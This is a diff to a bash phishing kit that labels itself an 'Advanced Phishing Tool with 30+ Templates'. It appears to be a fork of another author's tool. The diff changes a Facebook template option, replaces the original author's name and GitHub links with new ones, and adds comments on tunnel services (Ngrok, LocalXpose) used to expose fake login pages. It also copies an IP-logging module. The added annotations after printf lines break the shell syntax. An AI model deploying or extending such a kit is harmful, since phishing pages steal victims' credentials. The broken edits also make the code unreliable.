@@ -229,7 +229,7 @@ read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: 
 
 
 if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-website="facebook"
+website="FACEBOOK"
 tunnel_menu
 elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
 website="fb_advanced"
@@ -338,13 +338,7 @@ printf "\e[0m\e[93m | \| |__ _/ \_   |    _|  | _|_ ___||  |_|__ | \_ \e[0m\e[1;
 printf "\e[0m\n"
 printf "    \e[0m\e[1;44m Advanced Phishing Tool with 30+ Templates\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TAHMID RAYAT \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
-printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/htr-tech\e[0m\n"
-printf "\e[0m\n"
-printf "\e[0m\e[92m  Instagram \e[0m\e[91m  : \e[0m\e[96mhttps://instagr.am/tahmid.rayat\e[0m\n"
-printf "\e[0m\n"
-printf "\e[0m\e[92m  Version \e[0m\e[91m    : \e[0m\e[93m1.0\e[0m\n"
+printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m HASNAIN KING\e[0m\e[91m[\e[0m\e[93m HTR-TECH
 printf "\e[0m\n"
 printf "         \e[0m\e[1;44m Follow Our Github For More Tools \e[0m\n"
 printf "\e[0m\n"
@@ -361,7 +355,7 @@ menu
 elif [[ $about_option == 99 ]]; then
 sleep 1
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/asgharhusnain866 for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -392,9 +386,9 @@ cp -f .Modules/ip.php .htr/www/
 def_tunnel_menu="2"
 smallbanner
 printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
+printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n" [need account on github and connect to authtoken]
 printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
-printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
+printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n" [shows n't give personal but works]
 printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
